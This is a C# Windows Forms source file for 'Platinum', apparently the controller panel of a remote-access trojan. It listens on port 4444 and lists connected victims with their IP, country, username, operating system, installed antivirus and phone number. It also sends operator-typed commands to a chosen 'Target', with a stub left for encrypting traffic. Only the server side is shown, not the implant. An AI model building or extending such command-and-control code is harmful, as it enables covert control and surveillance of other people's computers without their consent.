using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.IO;

namespace Platinum
{
    public partial class Form1 : Form
    {
        #region Variables
        private static readonly Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private static readonly List<Socket> clientSockets = new List<Socket>();
        private const int BUFFER_SIZE = 4096; //2048;
        private const int PORT = 4444;
        private static readonly byte[] buffer = new byte[BUFFER_SIZE];
        private Timer timer = new Timer();
        Socket TargetClient { get; set; }
        #endregion
        public Form1()
        {
            InitializeComponent();
            #region Users
            users.View = View.Details;
            users.FullRowSelect = true;
            users.Columns.Add("Nick", 70);
            users.Columns.Add("IP Address", 70);
            users.Columns.Add("Country", 70);
            users.Columns.Add("Id(Mac/Cpu)", 120);
            users.Columns.Add("Username", 80);
            users.Columns.Add("Operating System", 120);
            users.Columns.Add("Antivirus", 120);
            users.Columns.Add("Version", 60);
            users.Columns.Add("Phone No", 128);
            users.Columns.Add("Device" ,130);
            #endregion
            timer.Tick += Refresh;
            timer.Interval = 500;
            timer.Start();
            //AddClient();
            SetupServer();
            //CloseAllSockets();
        }

        private void SetupServer()
        {
            logs.Items.Add("Setting up server...");
            serverSocket.Bind(new IPEndPoint(IPAddress.Any, PORT));
            serverSocket.Listen(0);
            serverSocket.BeginAccept(AcceptCallback, null);
            logs.Items.Add("Server setup complete");
        }

        private void CloseAllSockets()
        {
            foreach (Socket socket in clientSockets)
            {
                //send disconnect command to client first. or just make it so when server discconects they don't crush & retry to connect.
                socket.Shutdown(SocketShutdown.Both);
                socket.Close();
            }
            serverSocket.Close();
        }

        private void AcceptCallback(IAsyncResult AR)
        {
            Socket socket;

            try
            {
                socket = serverSocket.EndAccept(AR);
            }
            catch (ObjectDisposedException) // I cannot seem to avoid this (on exit when properly closing sockets)
            {
                return;
            }

            socket.BeginReceive(buffer, 0, BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket);
            updateUI(() => logs.Items.Add("Client connected, waiting for request..."));
            serverSocket.BeginAccept(AcceptCallback, null);
        }

        //Vayne code
        private void updateUI(Action action)
        {
            this.Invoke(new Action(action), null);
        }

        private void ReceiveCallback(IAsyncResult AR)
        {
            Socket current = (Socket)AR.AsyncState;
            int received;
            try
            {
                received = current.EndReceive(AR);
                if (!clientSockets.Contains(current) && clientSockets != null)
                {
                    clientSockets.Add(current);
                    TargetClient = current;
                    SendCmdToTarget("Info~");
                }//Get Info
            }
            catch (SocketException eee)
            {
                updateUI(() => logs.Items.Add("Client forcefully disconnected"));
                //Does this belong here or what??
                updateUI(() => logs.Items.Add("Error: " + eee));
                //Get client's id
                for (int a = 0; a < clientSockets.Count; a++)
                {
                    if (current == clientSockets[a]) { RemoveClient(current, a); }
                }
                return;
            }
            
            byte[] recBuf = new byte[received];
            Array.Copy(buffer, recBuf, received);
            string text = Encoding.ASCII.GetString(recBuf);
            updateUI(() => logs.Items.Add("Received Text: " + text));
            //text = "Info~Dde32d|127.0.0.1|USA|Dde32d|daniel|Win10 build...|Win defender|0.1 Beta|N/A|Dell Workstation";
            if (text.Contains("Info~"))
            {
                ProccessData(text);
            }

            //switch (text.ToLower())
            //{
            //    case "get time":
            //        updateUI(() => logs.Items.Add("Text is a get time request"));
            //        byte[] data = Encoding.ASCII.GetBytes(DateTime.Now.ToLongTimeString());
            //        current.Send(data);
            //        updateUI(() => logs.Items.Add("Time sent to client"));
            //        break;
            try
            {
                current.BeginReceive(buffer, 0, BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current);
            }
            catch (Exception ex)
            {
                updateUI(() => logs.Items.Add("Error: " + ex));
                //Get client's id
                for (int a = 0; a <= clientSockets.Count; a++)
                {
                    if (current == clientSockets[a]) { RemoveClient(current, a); }
                }
                if (clientSockets.Count > 0)
                {
                    current = clientSockets[0];
                    updateUI(() => logs.Items.Add("Chosing client 0."));
                }
                else current.Close();
            }
        }

        public void ProccessData(string text)
        {
            try
            {//Info~Dde32d|127.0.0.1|USA|Dde32d|daniel|Win10 build...|Win defender|0.1 Beta|N/A|Dell Workstation
                string _text = text.Split('~')[1]; //Remove Info~
                string[] row =
                {
                     _text.Split('|')[0],
                     _text.Split('|')[1],
                     _text.Split('|')[2],
                     _text.Split('|')[3],
                     _text.Split('|')[4],
                     _text.Split('|')[5],
                     _text.Split('|')[6],
                     _text.Split('|')[7],
                     _text.Split('|')[8],
                     _text.Split('|')[9],
                };
                ListViewItem item = new ListViewItem(row);
                updateUI(() => users.Items.Add(item));
            }
            catch (Exception e)
            { MessageBox.Show(e.ToString()); }
        }

        void RemoveClient(Socket client, int id)
        {
            try
            {
                clientSockets.Remove(client);
                updateUI(() => users.Items.Remove(users.Items[id]));
                updateUI(() => logs.Items.Add("Removed a Client! id=" + id));
                TargetClient = null;
            }catch { }
        }

        private void Refresh(object sender, EventArgs e)
        {
            if (users.Items.Count > 0 && users.FocusedItem != null)
            {
                try
                {
                    int id = users.SelectedIndices[0];
                    TargetClient = clientSockets[id];
                }
                catch(Exception) { /*updateUI(() => logs.Items.Add(exc.ToString()));*/ } // do nth with it...
            }
        }//Just get the selected client.

        private void SendCmdToTarget(string cmd)
        {
            if (TargetClient != null)
            {
                logs.Items.Add(cmd);
                cmd = Encrypt(cmd);
                byte[] dataToSend = Encoding.ASCII.GetBytes(cmd);
                TargetClient.Send(dataToSend, 0, cmd.Length, SocketFlags.None);
            }
            else
            {
                MessageBox.Show("Select Your Target!", "Platinum", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }

        string Encrypt(string cmd)
        {
            //No encrypt 4 now
            return cmd;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string text = textBox1.Text;
            SendCmdToTarget(text);
        }
    }
}
